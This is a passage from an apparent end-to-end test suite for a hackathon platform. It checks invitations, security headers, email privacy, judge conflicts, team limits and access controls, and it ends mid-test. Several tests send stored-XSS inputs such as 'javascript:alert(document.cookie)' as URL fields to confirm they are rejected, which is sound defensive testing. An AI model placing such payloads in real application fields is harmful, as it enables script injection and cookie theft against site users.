    assert.equal(res.data?.invitation?.receiver_id, null);
    assert.equal(res.data?.invitation?.receiver_email, prospectiveEmail);

    // Verify NO user record was created in database
    const publicUsers = await sql`SELECT id FROM public.users WHERE email = ${prospectiveEmail};`;
    assert.equal(publicUsers.length, 0, "A user was improperly auto-created in public.users!");

    const neonUsers = await sql`SELECT id FROM neon_auth.user WHERE email = ${prospectiveEmail};`;
    assert.equal(neonUsers.length, 0, "A user was improperly auto-created in neon_auth.user!");
  });

  test("When invited user registers or logs in with that email, the pending invitation is linked", async () => {
    // Provision user account and session simulating a new registration/login with that email
    prospectiveUserId = crypto.randomUUID();
    await sql`
      INSERT INTO neon_auth.user (id, name, email, "emailVerified", "createdAt", "updatedAt")
      VALUES (${prospectiveUserId}::uuid, 'Prospective Builder', ${prospectiveEmail}, true, NOW(), NOW());
    `;
    await sql`
      INSERT INTO neon_auth.session (id, "userId", token, "expiresAt", "createdAt", "updatedAt")
      VALUES (${crypto.randomUUID()}::uuid, ${prospectiveUserId}::uuid, ${PROSPECTIVE_TOKEN}, NOW() + INTERVAL '1 day', NOW(), NOW());
    `;

    // User accesses their invitations
    const res = await api("/api/team-invites", {
      token: PROSPECTIVE_TOKEN,
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.success, true);

    const invite = res.data?.invitations?.find((i: any) => i.id === pendingInviteId);
    assert.ok(invite, "User could not find the invitation sent to their email");
    assert.equal(invite.receiver_id, prospectiveUserId);

    // Verify in database that receiver_id is now populated with the user ID
    const dbInvite = await sql`SELECT receiver_id FROM public.team_invitations WHERE id = ${pendingInviteId}::uuid;`;
    assert.equal(dbInvite[0]?.receiver_id, prospectiveUserId);
  });

  test("Newly registered user can accept the linked team invitation", async () => {
    const res = await api(`/api/team-invites/${pendingInviteId}`, {
      method: "PATCH",
      token: PROSPECTIVE_TOKEN,
      body: { status: "accepted" },
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.success, true);
    assert.equal(res.data?.invitation?.status, "accepted");
    assert.equal(res.data?.invitation?.receiver_id, prospectiveUserId);
  });

  test("User cannot toggle state of an already accepted invitation (prevent infinite state toggling 2.6)", async () => {
    const res = await api(`/api/team-invites/${pendingInviteId}`, {
      method: "PATCH",
      token: PROSPECTIVE_TOKEN,
      body: { status: "declined" },
    });

    assert.equal(res.status, 400);
    assert.equal(res.data?.error, "This invitation has already been accepted.");
  });

  after(async () => {
    if (pendingInviteId) {
      await sql`DELETE FROM public.team_invitations WHERE id = ${pendingInviteId}::uuid;`;
    }
    if (prospectiveUserId) {
      await sql`DELETE FROM neon_auth.session WHERE "userId" = ${prospectiveUserId}::uuid;`;
    }
    if (prospectiveUserId) {
      await sql`DELETE FROM neon_auth.user WHERE id = ${prospectiveUserId}::uuid;`;
      await sql`DELETE FROM public.users WHERE id = ${prospectiveUserId};`;
    }
  });
});

describe("Suite G: HTTP Security Headers (next.config.ts)", () => {
  test("HTTP responses return all required security headers", async () => {
    const res = await fetch(`${BASE_URL}/`);
    assert.equal(res.status, 200);

    const xFrameOptions = res.headers.get("x-frame-options");
    const xContentTypeOptions = res.headers.get("x-content-type-options");
    const referrerPolicy = res.headers.get("referrer-policy");
    const permissionsPolicy = res.headers.get("permissions-policy");
    const hsts = res.headers.get("strict-transport-security");

    assert.equal(xFrameOptions, "DENY", "X-Frame-Options must be DENY");
    assert.equal(xContentTypeOptions, "nosniff", "X-Content-Type-Options must be nosniff");
    assert.equal(referrerPolicy, "strict-origin-when-cross-origin", "Referrer-Policy must be strict-origin-when-cross-origin");
    assert.ok(permissionsPolicy?.includes("camera=()"), "Permissions-Policy must disable camera");
    assert.ok(permissionsPolicy?.includes("microphone=()"), "Permissions-Policy must disable microphone");
    assert.ok(permissionsPolicy?.includes("geolocation=()"), "Permissions-Policy must disable geolocation");
    assert.ok(hsts?.includes("max-age=63072000"), "HSTS header must specify max-age=63072000");
  });
});

describe("Suite M: Private Email Exposure Prevention in RSC Flight Payloads (2.2)", () => {
  test("Anonymous visitor fetching /users/[id] does NOT receive builder's private email in HTML or RSC payload", async () => {
    const res = await fetch(`${BASE_URL}/users/${builderId}`);
    assert.equal(res.status, 200);
    const html = await res.text();
    assert.equal(
      html.includes(builderEmail),
      false,
      `Private email ${builderEmail} leaked in public user profile HTML / RSC flight payload for anonymous visitor!`
    );
  });

  test("Another authenticated user (rival) fetching /users/[id] does NOT receive builder's private email", async () => {
    const res = await fetch(`${BASE_URL}/users/${builderId}`, {
      headers: {
        Cookie: `neon-auth.session_token=${RIVAL_TOKEN}`,
      },
    });
    assert.equal(res.status, 200);
    const html = await res.text();
    assert.equal(
      html.includes(builderEmail),
      false,
      `Private email ${builderEmail} leaked in public user profile HTML / RSC flight payload for other user!`
    );
  });

  test("Profile owner (builder) fetching their own public /users/[id] profile CAN see their email in flight payload", async () => {
    const res = await fetch(`${BASE_URL}/users/${builderId}`, {
      headers: {
        Cookie: `neon-auth.session_token=${BUILDER_TOKEN}`,
      },
    });
    assert.equal(res.status, 200);
    const html = await res.text();
    assert.equal(
      html.includes(builderEmail),
      true,
      `Profile owner could not view their own email on profile!`
    );
  });

  test("Admin fetching /users/[id] CAN see user email in flight payload", async () => {
    const res = await fetch(`${BASE_URL}/users/${builderId}`, {
      headers: {
        Cookie: `neon-auth.session_token=${ADMIN_TOKEN}`,
      },
    });
    assert.equal(res.status, 200);
    const html = await res.text();
    assert.equal(
      html.includes(builderEmail),
      true,
      `Platform administrator could not view user email!`
    );
  });
});

describe("Suite N: Judge Conflict of Interest Prevention (Self-Evaluation Prevention 2.3)", () => {
  let judgeSubId = "";

  before(async () => {
    // Promote builder to judge to simulate a judge who submitted their own project
    await sql`UPDATE public.users SET role = 'judge' WHERE id = ${builderId};`;
    await sql`UPDATE neon_auth.user SET role = 'judge' WHERE id = ${builderId}::uuid;`;
  });

  after(async () => {
    // Restore builder role to 'user'
    await sql`UPDATE public.users SET role = 'user' WHERE id = ${builderId};`;
    await sql`UPDATE neon_auth.user SET role = 'user' WHERE id = ${builderId}::uuid;`;
    if (judgeSubId) {
      await sql`DELETE FROM public.project_evaluations WHERE submission_id = ${judgeSubId}::uuid;`;
      await sql`DELETE FROM public.hackathon_submissions WHERE id = ${judgeSubId}::uuid;`;
    }
  });

  test("Judge cannot evaluate their own project submission (creator conflict of interest)", async () => {
    const res = await api("/api/admin/judging", {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        submission_id: submissionId,
        hackathon_id: hackathonId,
        score_innovation: 10,
        score_technical: 10,
        score_design: 10,
        score_impact: 10,
        score_presentation: 10,
        award: "🥇 1st Place Champion",
      },
    });

    assert.equal(res.status, 403);
    assert.equal(res.data?.error, "Judges cannot evaluate their own project submission.");
  });

  test("Judge cannot evaluate a project where they are listed as a team member", async () => {
    // Create a new submission where the senior judge (judgeId) is added as a team member
    const teamSubRes = await sql`
      INSERT INTO public.hackathon_submissions (
        id, hackathon_id, user_id, title, tagline, description, tech_stack,
        team_members, team_member_ids, created_at, updated_at
      ) VALUES (
        ${crypto.randomUUID()}::uuid,
        ${hackathonId}::uuid,
        ${rivalId},
        'Co-authored AI Project',
        'Built with senior judge',
        'Co-authored submission test',
        ARRAY['Python'],
        ${JSON.stringify([{ id: rivalId, name: "Rival" }, { id: judgeId, name: "Judge Teammate" }])}::jsonb,
        ARRAY[${rivalId}, ${judgeId}]::text[],
        NOW(),
        NOW()
      )
      RETURNING id;
    `;
    judgeSubId = teamSubRes[0].id;

    // Senior judge attempts to evaluate this team project
    const res = await api("/api/admin/judging", {
      method: "POST",
      token: JUDGE_TOKEN,
      body: {
        submission_id: judgeSubId,
        hackathon_id: hackathonId,
        score_innovation: 10,
        score_technical: 10,
        score_design: 10,
        score_impact: 10,
        score_presentation: 10,
        award: "🥇 1st Place Champion",
      },
    });

    assert.equal(res.status, 403);
    assert.equal(res.data?.error, "Judges cannot evaluate their own project submission.");
  });

  test("Independent judge CAN evaluate project submission where they have no conflict of interest", async () => {
    const res = await api("/api/admin/judging", {
      method: "POST",
      token: JUDGE_TOKEN,
      body: {
        submission_id: submissionId, // created by builderId, judgeId is NOT in team
        hackathon_id: hackathonId,
        score_innovation: 9,
        score_technical: 9,
        score_design: 9,
        score_impact: 9,
        score_presentation: 9,
        feedback: "Fair and objective independent evaluation.",
      },
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.success, true);
  });
});

describe("Suite O: Team Size Limit Enforcement (2.5)", () => {
  let smallTeamHackathonSlug = "";
  let smallTeamHackathonId = "";

  before(async () => {
    smallTeamHackathonSlug = `team-limit-hackathon-${Date.now()}`;
    const createRes = await api("/api/admin/hackathons", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        title: "Duo Sprint Hackathon",
        slug: smallTeamHackathonSlug,
        tagline: "Strict duo-only hackathon challenge",
        description: "Teams cannot exceed 2 members.",
        format: "virtual",
        prize_pool: "₹50,000",
        currency: "INR",
        max_team_size: 2,
        start_date: new Date(Date.now() - 3600000).toISOString(),
        end_date: new Date(Date.now() + 86400000).toISOString(),
      },
    });

    assert.equal(createRes.status, 201);
    assert.ok(createRes.data?.hackathon?.id);
    smallTeamHackathonId = createRes.data.hackathon.id;

    // Register builder to this hackathon
    await api(`/api/hackathons/${smallTeamHackathonSlug}/register`, {
      method: "POST",
      token: BUILDER_TOKEN,
      body: { participation_type: "team" },
    });
  });

  after(async () => {
    if (smallTeamHackathonId) {
      await sql`DELETE FROM public.hackathon_submissions WHERE hackathon_id = ${smallTeamHackathonId}::uuid;`;
      await sql`DELETE FROM public.hackathon_registrations WHERE hackathon_id = ${smallTeamHackathonId}::uuid;`;
      await sql`DELETE FROM public.hackathons WHERE id = ${smallTeamHackathonId}::uuid;`;
    }
  });

  test("Submitting with team size exceeding max_team_size is rejected with 400", async () => {
    const res = await api(`/api/hackathons/${smallTeamHackathonSlug}/submissions`, {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        title: "Over-sized Swarm Project",
        description: "Attempting to submit with 3 members to a 2-person hackathon.",
        team_members: [
          { id: builderId, name: "Builder One", role: "Lead" },
          { id: rivalId, name: "Builder Two", role: "Dev" },
          { id: judgeId, name: "Builder Three", role: "Designer" },
        ],
        team_member_ids: [builderId, rivalId, judgeId],
      },
    });

    assert.equal(res.status, 400);
    assert.match(res.data?.error, /Team size exceeds maximum allowed limit \(2 members\)/i);
  });

  test("Submitting with valid team size within max_team_size succeeds with 200", async () => {
    const res = await api(`/api/hackathons/${smallTeamHackathonSlug}/submissions`, {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        title: "Valid Duo Swarm Project",
        description: "Compliant two-person submission within max_team_size.",
        team_members: [
          { id: builderId, name: "Builder One", role: "Lead" },
          { id: rivalId, name: "Builder Two", role: "Dev" },
        ],
        team_member_ids: [builderId, rivalId],
      },
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.success, true);
    assert.equal(res.data?.submission?.title, "Valid Duo Swarm Project");
  });
});

describe("Suite P: Project Screenshots Submission & Media Carousel", () => {
  let carouselHackathonSlug = "";
  let carouselHackathonId = "";
  let carouselSubmissionId = "";

  const testScreenshots = [
    "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200",
    "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=1200",
    "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1200",
  ];

  before(async () => {
    carouselHackathonSlug = "carousel-hackathon-" + Date.now();
    const createRes = await api("/api/admin/hackathons", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        title: "Carousel & Media Hackathon",
        slug: carouselHackathonSlug,
        tagline: "Testing media carousel with screenshots and video",
        description: "Hackathon testing screenshot submissions and horizontal scrollbar carousel.",
        format: "virtual",
        prize_pool: "₹1,00,000",
        currency: "INR",
        start_date: new Date(Date.now() - 3600000).toISOString(),
        end_date: new Date(Date.now() + 86400000 * 7).toISOString(),
      },
    });
    assert.equal(createRes.status, 201);
    assert.ok(createRes.data?.hackathon?.id);
    carouselHackathonId = createRes.data.hackathon.id;

    await api(`/api/hackathons/${carouselHackathonSlug}/register`, {
      method: "POST",
      token: BUILDER_TOKEN,
      body: { participation_type: "solo" },
    });
  });

  after(async () => {
    if (carouselHackathonId) {
      await sql`DELETE FROM public.hackathon_submissions WHERE hackathon_id = ${carouselHackathonId}::uuid;`;
      await sql`DELETE FROM public.hackathon_registrations WHERE hackathon_id = ${carouselHackathonId}::uuid;`;
      await sql`DELETE FROM public.hackathons WHERE id = ${carouselHackathonId}::uuid;`;
    }
  });

  test("Submitting with invalid screenshot URL (javascript: URI) is rejected with 400", async () => {
    const res = await api(`/api/hackathons/${carouselHackathonSlug}/submissions`, {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        title: "XSS In Screenshot Project",
        description: "Attempting to inject javascript scheme into screenshots array.",
        screenshots: ["javascript:alert(1)"],
      },
    });

    assert.equal(res.status, 400);
    assert.match(res.data?.error, /Screenshot URLs must start with http:\/\/ or https:\/\//i);
  });

  test("Builder can submit project with multiple screenshots and demo video", async () => {
    const res = await api(`/api/hackathons/${carouselHackathonSlug}/submissions`, {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        title: "Multi-Screenshot Showcase App",
        tagline: "Rich project gallery with screenshots and video",
        description: "Detailed submission with 3 screenshots and YouTube pitch video walkthrough.",
        video_url: "https://youtube.com/watch?v=dQw4w9WgXcQ",
        cover_image: "https://images.unsplash.com/photo-1451187580459-43490279c0fa?w=1200",
        screenshots: testScreenshots,
        tech_stack: ["Next.js", "TypeScript", "TailwindCSS"],
      },
    });

    assert.equal(res.status, 200);
    assert.equal(res.data?.success, true);
    assert.equal(res.data?.submission?.title, "Multi-Screenshot Showcase App");
    assert.deepEqual(res.data?.submission?.screenshots, testScreenshots);
    carouselSubmissionId = res.data.submission.id;
  });

  test("Direct Project Details page (/projects/[id]) renders media gallery carousel and horizontal strip", async () => {
    assert.ok(carouselSubmissionId, "Submission ID must be present");
    const { status, text } = await fetchHtml(`/projects/${carouselSubmissionId}`);

    assert.equal(status, 200);
    // Verified Pitch video embed
    assert.match(text, /youtube-nocookie\.com\/embed\/dQw4w9WgXcQ/);
    // Verified Project Media Gallery heading
    assert.match(text, /Project Media Gallery/);
    // Verified screenshots present in the media strip
    assert.match(text, /photo-1555066931-4365d14bab8c/);
    assert.match(text, /photo-1618005182384-a83a8bd57fbe/);
    assert.match(text, /photo-1526374965328-7f61d4dc18c5/);
  });

  test("Admin can update screenshots array via PATCH /api/admin/projects/[id]", async () => {
    assert.ok(carouselSubmissionId, "Submission ID must be present");
    const updatedScreenshots = [
      "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=1200",
      "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1200",
    ];

    const patchRes = await api(`/api/admin/projects/${carouselSubmissionId}`, {
      method: "PATCH",
      token: ADMIN_TOKEN,
      body: {
        screenshots: updatedScreenshots,
      },
    });

    assert.equal(patchRes.status, 200);
    assert.equal(patchRes.data?.success, true);
    assert.deepEqual(patchRes.data?.project?.screenshots, updatedScreenshots);
  });
});

describe("Suite Q: Critical Access & Security Fixes (1.1, 1.2, 1.3, 1.4, 1.5, 2.1)", () => {
  let draftHackathonId: string;
  let draftHackathonSlug: string;
  let upcomingHackathonId: string;
  let upcomingHackathonSlug: string;
  let cappedHackathonId: string;
  let cappedHackathonSlug: string;

  after(async () => {
    if (draftHackathonId) {
      await sql`DELETE FROM public.hackathons WHERE id = ${draftHackathonId}::uuid;`;
    }
    if (upcomingHackathonId) {
      await sql`DELETE FROM public.hackathons WHERE id = ${upcomingHackathonId}::uuid;`;
    }
    if (cappedHackathonId) {
      await sql`DELETE FROM public.hackathon_submissions WHERE hackathon_id = ${cappedHackathonId}::uuid;`;
      await sql`DELETE FROM public.hackathon_registrations WHERE hackathon_id = ${cappedHackathonId}::uuid;`;
      await sql`DELETE FROM public.hackathons WHERE id = ${cappedHackathonId}::uuid;`;
    }
  });

  test("1.1. Non-admin user querying GET /api/admin/hackathons/[id] receives 403 Forbidden", async () => {
    // Attempt with regular user token
    const res = await api(`/api/admin/hackathons/${hackathonId}`, {
      method: "GET",
      token: BUILDER_TOKEN,
    });
    assert.equal(res.status, 403);
    assert.match(res.data?.error, /Forbidden/i);

    // Attempt with admin token succeeds
    const adminRes = await api(`/api/admin/hackathons/${hackathonId}`, {
      method: "GET",
      token: ADMIN_TOKEN,
    });
    assert.equal(adminRes.status, 200);
    assert.ok(adminRes.data?.hackathon);
  });

  test("1.2. Unpublished draft hackathon is hidden (404) from non-admins but viewable by admin", async () => {
    // Create a draft hackathon
    const createRes = await api("/api/admin/hackathons", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        title: "Top Secret Draft Hackathon",
        tagline: "Internal draft only",
        description: "Not published yet",
        status: "draft",
        start_date: new Date(Date.now() + 86400000).toISOString(),
        end_date: new Date(Date.now() + 86400000 * 5).toISOString(),
      },
    });
    assert.equal(createRes.status, 201);
    draftHackathonId = createRes.data?.hackathon?.id;
    draftHackathonSlug = createRes.data?.hackathon?.slug;

    // Anonymous visitor gets 404
    const anonRes = await fetch(`${BASE_URL}/hackathons/${draftHackathonSlug}`);
    assert.equal(anonRes.status, 404);

    // Regular user gets 404
    const userRes = await fetch(`${BASE_URL}/hackathons/${draftHackathonSlug}`, {
      headers: { Cookie: `neon-auth.session_token=${BUILDER_TOKEN}` },
    });
    assert.equal(userRes.status, 404);

    // Admin user gets 200
    const adminRes = await fetch(`${BASE_URL}/hackathons/${draftHackathonSlug}`, {
      headers: { Cookie: `neon-auth.session_token=${ADMIN_TOKEN}` },
    });
    assert.equal(adminRes.status, 200);
    const adminHtml = await adminRes.text();
    assert.match(adminHtml, /Top Secret Draft Hackathon/);
  });

  test("1.3. Participant capacity limit cannot be bypassed via direct project submission", async () => {
    // Create a hackathon with max_participants = 1
    const createRes = await api("/api/admin/hackathons", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        title: "Capped Competition",
        tagline: "1 participant max",
        description: "Only one builder allowed",
        status: "active",
        max_participants: 1,
        start_date: new Date(Date.now() - 86400000).toISOString(),
        end_date: new Date(Date.now() + 86400000 * 3).toISOString(),
      },
    });
    assert.equal(createRes.status, 201);
    cappedHackathonId = createRes.data?.hackathon?.id;
    cappedHackathonSlug = createRes.data?.hackathon?.slug;

    // Register builder to fill capacity (1/1)
    const regRes = await api(`/api/hackathons/${cappedHackathonSlug}/register`, {
      method: "POST",
      token: BUILDER_TOKEN,
    });
    assert.equal(regRes.status, 200);

    // Rival (who is NOT registered) attempts to submit project directly (attempting bypass)
    const bypassRes = await api(`/api/hackathons/${cappedHackathonSlug}/submissions`, {
      method: "POST",
      token: RIVAL_TOKEN,
      body: {
        title: "Bypass Attempt App",
        description: "Trying to submit while capacity is full",
      },
    });
    assert.equal(bypassRes.status, 400);
    assert.match(bypassRes.data?.error, /maximum participant capacity/i);
  });

  test("1.4. Submissions are rejected on 'upcoming' hackathons before start date", async () => {
    // Create an upcoming hackathon starting tomorrow
    const createRes = await api("/api/admin/hackathons", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        title: "Future Challenge",
        tagline: "Starts tomorrow",
        description: "Cannot submit early",
        status: "upcoming",
        start_date: new Date(Date.now() + 86400000).toISOString(),
        end_date: new Date(Date.now() + 86400000 * 5).toISOString(),
      },
    });
    assert.equal(createRes.status, 201);
    upcomingHackathonId = createRes.data?.hackathon?.id;
    upcomingHackathonSlug = createRes.data?.hackathon?.slug;

    // Attempt to submit project
    const submitRes = await api(`/api/hackathons/${upcomingHackathonSlug}/submissions`, {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        title: "Early Bird Project",
        description: "Submitting before hackathon started",
      },
    });
    assert.equal(submitRes.status, 400);
    assert.match(submitRes.data?.error, /Submissions have not opened yet/i);
  });

  test("1.5. Cross-competition judging rejected when submission does not belong to hackathon", async () => {
    // Attempt to evaluate submissionId using a mismatched hackathon_id
    const fakeHackathonId = "00000000-0000-0000-0000-000000000001";
    const judgeRes = await api("/api/admin/judging", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        submission_id: submissionId,
        hackathon_id: fakeHackathonId, // Mismatched hackathon ID
        score_innovation: 9,
        score_technical: 8,
      },
    });
    assert.equal(judgeRes.status, 400);
    assert.match(judgeRes.data?.error, /does not belong to the specified hackathon/i);
  });

  test("2.1. Stored XSS prevention: javascript: website_url rejected in admin APIs", async () => {
    // Attempt to create hackathon with javascript: website_url
    const createRes = await api("/api/admin/hackathons", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        title: "XSS Hackathon Attempt",
        tagline: "XSS test",
        description: "Testing URL validation",
        website_url: "javascript:alert(document.cookie)",
        start_date: new Date().toISOString(),
        end_date: new Date(Date.now() + 86400000).toISOString(),
      },
    });
    assert.equal(createRes.status, 400);
    assert.match(createRes.data?.error, /URLs must start with http/i);

    // Attempt to update existing hackathon with javascript: website_url
    const patchRes = await api(`/api/admin/hackathons/${hackathonId}`, {
      method: "PATCH",
      token: ADMIN_TOKEN,
      body: {
        website_url: "javascript:alert(1)",
      },
    });
    assert.equal(patchRes.status, 400);
    assert.match(patchRes.data?.error, /URLs must start with http/i);
  });
});

describe("Suite R: Team Collaboration & State Fixes (3.1, 3.2, 3.3)", () => {
  let collabHackathonId: string;
  let collabHackathonSlug: string;
  let collabSubId: string;
  let inviteId1: string;
  let inviteId2: string;

  let member1Id: string;
  let member1Token: string;
  let member2Id: string;
  let member2Token: string;

  before(async () => {
    // Create two new builders for collaboration tests
    const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000);
    member1Token = "e2e_collab_m1_" + Date.now();
    member2Token = "e2e_collab_m2_" + Date.now();

    member1Id = await createActor("user", "Collab Builder 1", `collab1_${Date.now()}@example.com`);
    member2Id = await createActor("user", "Collab Builder 2", `collab2_${Date.now()}@example.com`);

    await sql`
      INSERT INTO neon_auth.session (id, "userId", token, "expiresAt", "createdAt", "updatedAt")
      VALUES
        (${crypto.randomUUID()}::uuid, ${member1Id}::uuid, ${member1Token}, ${expiresAt}, NOW(), NOW()),
        (${crypto.randomUUID()}::uuid, ${member2Id}::uuid, ${member2Token}, ${expiresAt}, NOW(), NOW())
      ON CONFLICT (token) DO NOTHING;
    `;

    // Create a 2-person hackathon (max_team_size = 2)
    const createRes = await api("/api/admin/hackathons", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        title: "Duo Team Championship",
        tagline: "Max 2 builders per team",
        description: "Testing team limits and member synchronization",
        status: "active",
        max_team_size: 2,
        start_date: new Date(Date.now() - 86400000).toISOString(),
        end_date: new Date(Date.now() + 86400000 * 3).toISOString(),
      },
    });
    assert.equal(createRes.status, 201);
    collabHackathonId = createRes.data.hackathon.id;
    collabHackathonSlug = createRes.data.hackathon.slug;

    // Register builder as creator
    await api(`/api/hackathons/${collabHackathonSlug}/register`, {
      method: "POST",
      token: BUILDER_TOKEN,
    });

    // Builder creates initial submission
    const subRes = await api(`/api/hackathons/${collabHackathonSlug}/submissions`, {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        title: "Duo Squad App",
        description: "Initial submission by creator",
      },
    });
    assert.equal(subRes.status, 200);
    collabSubId = subRes.data.submission.id;
  });

  after(async () => {
    if (collabHackathonId) {
      await sql`DELETE FROM public.team_invitations WHERE hackathon_id = ${collabHackathonId}::uuid;`;
      await sql`DELETE FROM public.hackathon_submissions WHERE hackathon_id = ${collabHackathonId}::uuid;`;
      await sql`DELETE FROM public.hackathon_registrations WHERE hackathon_id = ${collabHackathonId}::uuid;`;
      await sql`DELETE FROM public.hackathons WHERE id = ${collabHackathonId}::uuid;`;
    }
  });

  test("3.1. When an invitation is accepted, receiver_id is synchronized into submission.team_member_ids", async () => {
    // Send invite to member1
    const inviteRes = await api("/api/team-invites", {
      method: "POST",
      token: BUILDER_TOKEN,
      body: {
        hackathon_id: collabHackathonId,
        receiver_id: member1Id,
        team_name: "Duo Titans",
        role: "Co-Lead",
      },
    });
    assert.equal(inviteRes.status, 200);
    inviteId1 = inviteRes.data.invitation.id;

    // Member 1 accepts the invitation
    const acceptRes = await api(`/api/team-invites/${inviteId1}`, {
      method: "PATCH",
      token: member1Token,
      body: { status: "accepted" },
    });
    assert.equal(acceptRes.status, 200);

    // Verify submission row directly in database
    const subRows = await sql`
      SELECT team_member_ids, team_members
      FROM public.hackathon_submissions
      WHERE id = ${collabSubId}::uuid;
    `;
    assert.ok(subRows.length > 0);
    const memberIds = subRows[0].team_member_ids || [];
    assert.ok(
      memberIds.includes(member1Id),
      `Expected team_member_ids to include member1Id (${member1Id}), got ${JSON.stringify(memberIds)}`
    );

    // Verify project appears in member 1's profile projects
    const profileProjects = await sql`
      SELECT id FROM public.hackathon_submissions
      WHERE user_id = ${member1Id} OR ${member1Id} = ANY(team_member_ids);
    `;
    assert.ok(
      profileProjects.some((p: any) => p.id === collabSubId),
      "Accepted teammate must see project in their profile projects"
    );
  });

  test("3.2. Team size limit enforcement: second invite acceptance rejected when max_team_size (2) is reached", async () => {
    // Create an invite for member2 before limit check (or bypass)
    // Directly insert pending invitation into database to simulate race condition / concurrent invites
    const pendingInviteRes = await sql`
      INSERT INTO public.team_invitations (
        id, hackathon_id, sender_id, receiver_id, team_name, status, created_at, updated_at
      ) VALUES (
        ${crypto.randomUUID()}::uuid,
        ${collabHackathonId}::uuid,
        ${builderId},
        ${member2Id},
        'Duo Titans',
        'pending',
        NOW(),
        NOW()
      ) RETURNING id;
    `;
    inviteId2 = pendingInviteRes[0].id;

    // Member 2 attempts to accept invite into team that already has creator + member 1 = 2 members
    const acceptRes2 = await api(`/api/team-invites/${inviteId2}`, {
      method: "PATCH",
      token: member2Token,
      body: { status: "accepted" },
    });

    assert.equal(acceptRes2.status, 400);
    assert.match(acceptRes2.data?.error, /Team size exceeds maximum allowed limit \(2 members\)/i);
  });

  test("3.3. Teammate edit updates existing team submission without creating duplicate row", async () => {
    // Member 1 edits the project submission
    const editRes = await api(`/api/hackathons/${collabHackathonSlug}/submissions`, {
      method: "POST",
      token: member1Token,
      body: {
        title: "Duo Squad App - Updated by Teammate",
        description: "Refined architecture and tech stack updated by co-lead",
        tech_stack: ["TypeScript", "Next.js", "Neon"],
      },
    });

    assert.equal(editRes.status, 200);
    assert.equal(editRes.data.submission.id, collabSubId, "Must update the same canonical submission ID");
    assert.equal(editRes.data.submission.title, "Duo Squad App - Updated by Teammate");

    // Verify total submissions in this hackathon is STILL EXACTLY 1 (no duplicate row created)
    const countRows = await sql`
      SELECT COUNT(*)::int as count
      FROM public.hackathon_submissions
      WHERE hackathon_id = ${collabHackathonId}::uuid;
    `;
    assert.equal(countRows[0].count, 1, "Must not create a duplicate submission row for the teammate");

    // Verify both creator and member1 are in team_member_ids
    const updatedSub = await sql`
      SELECT user_id, team_member_ids
      FROM public.hackathon_submissions
      WHERE id = ${collabSubId}::uuid;
    `;
    assert.equal(updatedSub[0].user_id, builderId, "Original creator must remain primary author");
    assert.ok(updatedSub[0].team_member_ids.includes(builderId));
    assert.ok(updatedSub[0].team_member_ids.includes(member1Id));
  });
});

describe("Suite S: Robustness & Edge-Cases (2.2, 2.3, 4.1, 4.2)", () => {
  let robustHackathonIdA = "";
  const robustHackathonSlugA = `robust-a-${Date.now()}`;
  let robustHackathonIdB = "";
  const robustHackathonSlugB = `robust-b-${Date.now()}`;
  let ghostHackathonId = "";
  const ghostHackathonSlug = `ghost-hack-${Date.now()}`;

  before(async () => {
    // Create Hackathon A
    const resA = await api("/api/admin/hackathons", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        title: "Robustness Challenge A",
        slug: robustHackathonSlugA,
        tagline: "Testing edge cases and collisions",
        description: "Checking robustness",
        start_date: new Date(Date.now() - 3600000).toISOString(),
        end_date: new Date(Date.now() + 86400000 * 7).toISOString(),
        format: "online",
        prize_pool: "$5,000",
        status: "active",
      },
    });
    assert.equal(resA.status, 201);
    robustHackathonIdA = resA.data.hackathon.id;

    // Create Hackathon B
    const resB = await api("/api/admin/hackathons", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        title: "Robustness Challenge B",
        slug: robustHackathonSlugB,
        tagline: "Collision testing",
        description: "Checking collision avoidance",
        start_date: new Date(Date.now() - 3600000).toISOString(),
        end_date: new Date(Date.now() + 86400000 * 7).toISOString(),
        format: "online",
        prize_pool: "$5,000",
        status: "active",
      },
    });
    assert.equal(resB.status, 201);
    robustHackathonIdB = resB.data.hackathon.id;

    // Create Ghost Hackathon
    const resGhost = await api("/api/admin/hackathons", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        title: "Ghost Invite Challenge",
        slug: ghostHackathonSlug,
        tagline: "Testing invite permissions",
        description: "Ensures unregistered users cannot send invites",
        start_date: new Date(Date.now() - 3600000).toISOString(),
        end_date: new Date(Date.now() + 86400000 * 7).toISOString(),
        format: "online",
        prize_pool: "$5,000",
        status: "active",
      },
    });
    assert.equal(resGhost.status, 201);
    ghostHackathonId = resGhost.data.hackathon.id;
  });

  after(async () => {
    if (robustHackathonIdA) {
      await sql`DELETE FROM public.hackathons WHERE id = ${robustHackathonIdA}::uuid;`;
    }
    if (robustHackathonIdB) {
      await sql`DELETE FROM public.hackathons WHERE id = ${robustHackathonIdB}::uuid;`;
    }
    if (ghostHackathonId) {
      await sql`DELETE FROM public.hackathons WHERE id = ${ghostHackathonId}::uuid;`;
    }
  });

  test("2.2. Missing URL scheme validation in admin user creation (POST /api/admin/users)", async () => {
    // 1. Attempt to create user with malicious javascript: URL
    const badUrlRes = await api("/api/admin/users", {
      method: "POST",
      token: ADMIN_TOKEN,
      body: {
        name: "Malicious Admin Creation",
        email: `xss_admin_user_${Date.now()}@example.com`,
